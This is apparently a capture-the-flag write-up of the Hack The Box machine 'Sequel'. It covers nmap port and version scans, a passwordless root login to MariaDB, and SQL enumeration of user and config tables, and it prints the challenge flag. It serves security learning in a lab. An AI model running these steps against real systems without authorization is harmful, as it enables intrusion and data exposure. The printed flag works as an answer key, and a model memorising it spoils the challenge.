# HTB — Sequel

<img width="800" height="508" alt="image" src="https://github.com/user-attachments/assets/9c794ca4-6fb9-4e0d-8f05-1d90868ed5af" />


## Introduction

**Sequel** is an easy-level Hack The Box machine focused on **network enumeration and MariaDB/MySQL database enumeration**. The initial reconnaissance identified the target host, followed by a full TCP port scan that revealed a single exposed database service on port `3306`. Further service enumeration confirmed that the service was **MariaDB 10.3.27**. 

The database accepted a connection using the `root` account without requiring a password. After connecting, I enumerated the available databases and discovered an `htb` database containing `config` and `users` tables. The `users` table exposed several usernames and email addresses, while the `config` table contained application configuration values, including an authentication method and other security-related settings. 

---

## 1. Confirming the Target

I first verified that the target machine was reachable using `ping`:

```bash
ping 10.129.141.154
```

The target responded to ICMP requests, confirming that the host was reachable from my attacking machine. The response showed approximately 168–172 ms latency, although one packet was lost during the test. 

This step does not identify vulnerabilities by itself, but it confirms basic connectivity before starting service enumeration.

<img width="527" height="166" alt="image" src="https://github.com/user-attachments/assets/e8300e3d-93de-4427-9e8c-61e3995bca81" />


---

## 2. Full Port Scan

I then performed a full TCP port scan:

```bash
nmap -p- --min-rate 1000 -Pn 10.129.141.154
```

The options are useful here because `-p-` scans all TCP ports rather than only Nmap's default ports, while `--min-rate 1000` increases the scanning speed. `-Pn` tells Nmap to treat the host as online without relying on host discovery.

The scan identified one open TCP port:

```text
3306/tcp open mysql
```

Port `3306` is commonly used by **MySQL/MariaDB**, so the next step was to perform more detailed service enumeration. 

<img width="595" height="196" alt="image" src="https://github.com/user-attachments/assets/26fcf03e-f16a-4a64-839f-5f9cc5a3f242" />


---

## 3. Enumerating the MySQL Service

To identify the exact database software and version, I ran:

```bash
nmap -sV -p 3306 -Pn 10.129.141.154
```

The `-sV` option performs service and version detection, while `-p 3306` limits the scan to the discovered MySQL port.

The result identified the service as:

```text
3306/tcp open mysql
```

with additional information indicating:

```text
Protocol: 10
Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
```

Nmap therefore confirmed that the database service was **MariaDB 10.3.27** running on a Debian 10-based system. 

<img width="800" height="191" alt="image" src="https://github.com/user-attachments/assets/01855e7e-5610-44bb-b60b-d1cdfa6a933a" />


---

## 4. Connecting to MariaDB

I attempted to connect to the database using the `mysql` client:

```bash
mysql -h 10.129.141.154 -u root
```

The server initially returned a TLS/SSL-related error:

```text
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

This indicates that the client attempted to establish a secure connection, but the server did not support the requested SSL/TLS configuration.

I therefore retried the connection with SSL disabled:

```bash
mysql -h 10.129.141.154 -u root --skip-ssl
```

This successfully opened a MariaDB session:

```text
Welcome to the MariaDB monitor.
...
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
MariaDB [(none)]>
```

Most importantly, the connection succeeded using the `root` account without a password being supplied. This provided direct access to the database management interface. 

<img width="629" height="231" alt="image" src="https://github.com/user-attachments/assets/2f76b85f-16c3-49b3-89d4-d3912e84db02" />


---

## 5. Enumerating Databases

Once inside MariaDB, I enumerated the available databases:

```sql
SHOW DATABASES;
```

The server returned:

```text
information_schema
htb
mysql
performance_schema
```

The `htb` database was particularly interesting because it appeared to contain application-specific data rather than being a default MariaDB system database. 

I selected it with:

```sql
USE htb;
```

The `USE` command changes the current database, allowing subsequent queries such as `SHOW TABLES` and `SELECT` to operate against that database by default.

---

## 6. Enumerating Tables

I then listed the tables inside the `htb` database:

```sql
SHOW TABLES;
```

The database contained two tables:

```text
config
users
```

This immediately provided two useful enumeration targets: the application's configuration information and its stored user information. 

---

## 7. Enumerating the Users Table

I queried the contents of the `users` table:

```sql
SELECT * FROM users;
```

The table contained the following fields:

```text
id
username
email
```

The returned records included:

```text
admin    admin@sequel.htb
lara     lara@sequel.htb
sam      sam@sequel.htb
mary     mary@sequel.htb
```

This demonstrated that the database contained application user information, including usernames and email addresses. 

For enumeration purposes, these values are useful because usernames can potentially provide additional context for authentication testing or application discovery.

<img width="592" height="526" alt="image" src="https://github.com/user-attachments/assets/a762a9a0-b201-4585-9ce0-f06668da567f" />


---

## 8. Examining the Database Schema

I also examined the structure of both tables using:

```sql
DESCRIBE config;
DESCRIBE users;
```

The `config` table contained three columns:

```text
id
name
value
```

The `users` table contained:

```text
id
username
email
```

The schema information confirms how the application data is structured and shows that the `id` fields are automatically incremented primary keys. 

<img width="585" height="254" alt="image" src="https://github.com/user-attachments/assets/17386d9e-816f-4167-bbf2-e238f0666b6b" />


---

## 9. Enumerating Application Configuration

Finally, I queried the contents of the `config` table:

```sql
SELECT * FROM config;
```

The table contained several application settings:

```text
timeout              60s
security             default
auto_logout          false
max_size             2M
flag                 7b4bec00d1a39e3dd4e021ec3d915da8
enable_uploads       false
authentication_method radius
```

This is particularly interesting because configuration databases can expose information about how an application is designed and how authentication or other security mechanisms are implemented. 

The `authentication_method` value was set to:

```text
radius
```

while file uploads were disabled:

```text
enable_uploads = false
```

The configuration also exposed a `flag` value, which is relevant to the Hack The Box objective.

<img width="525" height="183" alt="image" src="https://github.com/user-attachments/assets/1e2f07ce-ea3c-4f9c-816d-b67bfa53fc95" />


---

## Conclusion

The attack path was primarily based on **service enumeration followed by unauthenticated database access**.

The overall process was:

```text
Target Discovery
      ↓
Full TCP Port Scan
      ↓
3306/tcp identified
      ↓
MariaDB version enumeration
      ↓
MariaDB connection as root
      ↓
Database enumeration
      ↓
htb database discovered
      ↓
config + users tables
      ↓
User and configuration enumeration
      ↓
Flag discovered
```

The key technical issue was that the MariaDB service was externally accessible and permitted a `root` database connection without a password. Once connected, the `htb` database could be enumerated directly, exposing application users and configuration data. 

